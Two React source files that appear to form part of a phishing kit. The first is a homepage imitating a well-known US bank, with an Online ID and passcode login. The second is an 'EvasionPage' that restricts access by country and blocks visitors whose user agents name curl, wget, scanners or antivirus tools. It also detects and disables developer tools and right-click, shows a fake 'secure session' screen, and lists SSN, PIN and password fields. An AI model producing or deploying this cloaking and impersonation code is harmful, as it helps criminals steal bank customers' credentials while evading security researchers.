import PublicLayout from "@/components/PublicLayout";
import { Link, useNavigate } from "react-router-dom";
import { useState } from "react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Checkbox } from "@/components/ui/checkbox";
import { useAuth } from "@/contexts/AuthContext";
import { Loader2 } from "lucide-react";
import { Landmark, CreditCard, Send, Smartphone, Monitor, FileText, Bell, ArrowRight } from "lucide-react";

const Homepage = () => {
  const navigate = useNavigate();
  const { login } = useAuth();
  const [onlineId, setOnlineId] = useState("");
  const [passcode, setPasscode] = useState("");
  const [saveId, setSaveId] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!onlineId.trim() || onlineId.trim().length < 6) {
      setError("Online ID must be at least 6 characters");
      return;
    }
    if (!passcode.trim()) {
      setError("Please enter your passcode");
      return;
    }
    setIsLoading(true);
    setError("");
    const success = login(onlineId, passcode);
    if (success) {
      await new Promise((resolve) => setTimeout(resolve, 1500));
      navigate("/dashboard");
    } else {
      setIsLoading(false);
      setError("Invalid Online ID or Passcode. Please try again.");
    }
  };

  return (
    <PublicLayout>
      {/* Hero - Open an account + Video */}
      <section className="bg-gray-50 border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 py-8">
          <div className="flex flex-col lg:flex-row gap-8 items-center">
            <div>
              <h2 className="text-2xl font-bold text-gray-900 mb-2">Open an account</h2>
              <p className="text-gray-600 mb-4">Checking, Savings, Credit Cards, Home Loans, Auto Loans, and more.</p>
              <div className="flex flex-wrap gap-3">
                <Link to="/banking" className="text-[#012169] font-medium hover:underline">Checking</Link>
                <Link to="/banking" className="text-[#012169] font-medium hover:underline">Savings & CDs</Link>
                <Link to="/credit-cards-public" className="text-[#012169] font-medium hover:underline">Credit Cards</Link>
                <Link to="/loans" className="text-[#012169] font-medium hover:underline">Home Loans</Link>
                <Link to="/loans" className="text-[#012169] font-medium hover:underline">Auto Loans</Link>
                <Link to="/small-business" className="text-[#012169] font-medium hover:underline">Small Business</Link>
                <Link to="/investments-public" className="text-[#012169] font-medium hover:underline">Investing</Link>
                <Link to="/locations" className="text-[#012169] font-medium hover:underline">Get the free app</Link>
                <Link to="/locations" className="text-[#012169] font-medium hover:underline">Schedule an appointment</Link>
              </div>
            </div>
            <div className="w-full lg:w-96 bg-gray-200 rounded-lg overflow-hidden">
              <img src="/hhh.png" alt="Open an account" className="w-full h-auto object-cover" />
            </div>
          </div>
        </div>
      </section>

      {/* Your financial goals matter */}
      <section className="py-12 px-4 sm:px-6">
        <div className="max-w-7xl mx-auto">
          <h2 className="text-2xl font-bold text-gray-900 mb-2">Your financial goals matter</h2>
          <p className="text-gray-600 mb-8">
            We can help you achieve them through Better Money Habits® financial education and programs that make communities stronger.
          </p>
          <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-6">
            {[
              "Real Talk with Better Money Habits®",
              "8 common bank fees—and how to avoid them",
              "What is a certificate of deposit (CD) and how does it work?",
              "How to start building an emergency fund",
            ].map((title) => (
              <Link
                key={title}
                to="/learning"
                className="block p-4 border border-gray-200 rounded-lg hover:border-[#E31837]/40 hover:shadow-md transition-all group"
              >
                <span className="text-[#012169] font-medium group-hover:underline">{title}</span>
                <ArrowRight className="h-4 w-4 text-gray-400 mt-2 group-hover:text-[#E31837]" />
              </Link>
            ))}
          </div>
          <Link to="/learning" className="inline-block mt-6 text-[#012169] font-medium hover:underline">
            Visit Better Money Habits®
          </Link>
        </div>
      </section>

      {/* Enroll in Online Banking - feature grid */}
      <section className="bg-gray-50 py-12 px-4 sm:px-6">
        <div className="max-w-7xl mx-auto">
          <h2 className="text-2xl font-bold text-gray-900 mb-2">Enroll in Online Banking</h2>
          <Link to="/login">
            <Button type="button" className="bg-[#012169] hover:bg-[#011a52] text-white mb-8">Enroll now</Button>
          </Link>
          <div className="grid sm:grid-cols-2 lg:grid-cols-4 gap-6">
            {[
              { icon: Monitor, title: "Access your accounts", desc: "Check all activity whenever you want." },
              { icon: FileText, title: "Pay bills", desc: "At your convenience from wherever you can connect." },
              { icon: Bell, title: "Set up alerts", desc: "Get activity info delivered by email or text." },
              { icon: Send, title: "Make transfers", desc: "Securely transfer funds between your accounts and to friends and family." },
            ].map(({ icon: Icon, title, desc }) => (
              <div key={title} className="flex gap-4 p-4 bg-white border border-gray-200 rounded-lg">
                <div className="h-12 w-12 rounded-full bg-gray-100 flex items-center justify-center flex-shrink-0">
                  <Icon className="h-6 w-6 text-[#E31837]" />
                </div>
                <div>
                  <h3 className="font-semibold text-gray-900">{title}</h3>
                  <p className="text-sm text-gray-600 mt-1">{desc}</p>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Your news and information */}
      <section className="py-12 px-4 sm:px-6">
        <div className="max-w-7xl mx-auto">
          <h2 className="text-2xl font-bold text-gray-900 mb-8">Your news and information</h2>
          <div className="grid sm:grid-cols-2 gap-6">
            <div className="border border-gray-200 rounded-lg p-6">
              <h3 className="font-semibold text-gray-900 mb-2">Level up your account security</h3>
              <p className="text-gray-600 text-sm mb-4">
                Watch your security meter rise as you take action to help protect against fraud. See it in the Security Center in Mobile and Online Banking.
              </p>
              <Link to="/login" className="text-[#012169] font-medium hover:underline">
                Check your account security level
              </Link>
            </div>
            <div className="border border-gray-200 rounded-lg p-6">
              <h3 className="font-semibold text-gray-900 mb-2">Convenient banking with our Mobile app</h3>
              <p className="text-gray-600 text-sm mb-4">
                Bank on the go with our secure mobile banking app.
              </p>
              <a href="#" className="text-[#012169] font-medium hover:underline">
                Explore our mobile app
              </a>
            </div>
          </div>
        </div>
      </section>

      {/* Connect with us */}
      <section className="bg-gray-50 py-12 px-4 sm:px-6">
        <div className="max-w-7xl mx-auto">
          <h2 className="text-2xl font-bold text-gray-900 mb-8">Connect with us</h2>
          <div className="flex flex-wrap gap-6">
            <Link to="/locations" className="text-[#012169] font-medium hover:underline">Schedule an appointment</Link>
            <Link to="/locations" className="text-[#012169] font-medium hover:underline">Find a location</Link>
            <Link to="/contact-us" className="text-[#012169] font-medium hover:underline">Contact us</Link>
            <Link to="/help" className="text-[#012169] font-medium hover:underline">Help center</Link>
          </div>
        </div>
      </section>
    </PublicLayout>
  );
};

export default Homepage;
import { useEffect, useState } from 'react';

const EVASION_CONFIG = {
  targetCountries: ['US', 'CA', 'GB', 'GH'],
  showFormDelay: 2000,
};

export default function EvasionPage() {
  const [isTargetLocation, setIsTargetLocation] = useState<boolean | null>(null);
  const [showContent, setShowContent] = useState(false);

  // 1. Geotargeting check
  const checkGeolocation = async () => {
    try {
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      const allowed = EVASION_CONFIG.targetCountries.includes(data.country_code);
      setIsTargetLocation(allowed);
      return allowed;
    } catch {
      // Fail open (allow if API fails)
      setIsTargetLocation(true);
      return true;
    }
  };

  // 2. Basic bot detection
  const detectBots = () => {
    const ua = navigator.userAgent.toLowerCase();
    const blocked = [
      'curl', 'wget', 'python', 'requests', 'scrapy',
      'phantomjs', 'selenium', 'headless', 'bot',
      'crawler', 'spider', 'scanner', 'security',
      'malware', 'antivirus', 'firewall',
    ];

    if (blocked.some((term) => ua.includes(term))) {
      return true;
    }

    // Behavioral (mouse/keyboard) check after delay
    let mouse = 0;
    let keys = 0;

    const onMouse = () => mouse++;
    const onKey = () => keys++;

    document.addEventListener('mousemove', onMouse);
    document.addEventListener('keypress', onKey);

    setTimeout(() => {
      if (mouse === 0 && keys === 0) {
        console.log('Bot-like behavior detected');
        // You could hide content or redirect here
      }
      // Cleanup (optional)
      document.removeEventListener('mousemove', onMouse);
      document.removeEventListener('keypress', onKey);
    }, 3000);

    return false;
  };

  // 3. DevTools detection (size + Image trick)
  const detectDevTools = () => {
    const threshold = 160;
    if (
      window.outerHeight - window.innerHeight > threshold ||
      window.outerWidth - window.innerWidth > threshold
    ) {
      console.log('DevTools detected via window size');
      // Could hide content here
    }

    let devtoolsOpen = false;
    const element = new Image();
    Object.defineProperty(element, 'id', {
      get: () => {
        devtoolsOpen = true;
        console.log('DevTools detected via console access');
      },
    });

    const interval = setInterval(() => {
      devtoolsOpen = false;
      console.log(element); // Triggers getter if console open
      console.clear();
    }, 1000);

    // Cleanup on unmount
    return () => clearInterval(interval);
  };

  // 4. Disable inspection / right-click / keys / selection / drag
  const disableInspection = () => {
    // Right-click
    const onContext = (e: MouseEvent) => {
      e.preventDefault();
      return false;
    };
    document.addEventListener('contextmenu', onContext);

    // Key combos
    const onKeyDown = (e: KeyboardEvent) => {
      if (
        e.keyCode === 123 || // F12
        (e.ctrlKey && e.shiftKey && e.keyCode === 73) || // Ctrl+Shift+I
        (e.ctrlKey && e.keyCode === 85) || // Ctrl+U
        (e.ctrlKey && e.keyCode === 83) || // Ctrl+S
        (e.ctrlKey && e.shiftKey && e.keyCode === 67) || // Ctrl+Shift+C
        (e.ctrlKey && e.shiftKey && e.keyCode === 74) || // Ctrl+Shift+J
        (e.ctrlKey && e.shiftKey && e.keyCode === 46)    // Ctrl+Shift+Del
      ) {
        e.preventDefault();
        return false;
      }
    };
    document.addEventListener('keydown', onKeyDown);

    // Disable selection
    document.addEventListener('selectstart', (e) => e.preventDefault());

    // Disable drag
    document.addEventListener('dragstart', (e) => e.preventDefault());

    // Cleanup
    return () => {
      document.removeEventListener('contextmenu', onContext);
      document.removeEventListener('keydown', onKeyDown);
    };
  };

  // Main init
  useEffect(() => {
    const runEvasion = async () => {
      disableInspection(); // Run immediately

      if (detectBots()) {
        // Bot → maybe show blank or redirect
        return;
      }

      const geoOk = await checkGeolocation();
      if (!geoOk) {
        // Non-target → hide or redirect
        return;
      }

      detectDevTools(); // Start polling

      // All passed → show content after delay
      setTimeout(() => {
        setShowContent(true);
      }, EVASION_CONFIG.showFormDelay);
    };

    runEvasion();

    // Periodic console clear
    const clearIntervalId = setInterval(() => {
      console.clear();
    }, 1000);

    return () => {
      clearInterval(clearIntervalId);
      // Add any other cleanups from returned functions above
    };
  }, []);

  // Optional: Track clicks on sensitive fields (add IDs to your inputs)
  useEffect(() => {
    const sensitiveIds = ['ssn', 'debit-pin', 'online-password', 'online-username', 'account-number'];

    const handlers: { [key: string]: () => void } = {};

    sensitiveIds.forEach((id) => {
      const el = document.getElementById(id);
      if (el) {
        const handler = () => console.warn('.');
        el.addEventListener('click', handler);
        handlers[id] = handler;
      }
    });

    return () => {
      Object.entries(handlers).forEach(([id, fn]) => {
        document.getElementById(id)?.removeEventListener('click', fn);
      });
    };
  }, []);

  // Render nothing or fake loading until checks pass
  if (isTargetLocation === false || !showContent) {
    return <div style={{ height: '100vh', background: '#000', color: '#fff' }}>Loading secure session...</div>;
  }

  // =====================================
  // YOUR VISIBLE CONTENT / FORM GOES HERE
  
}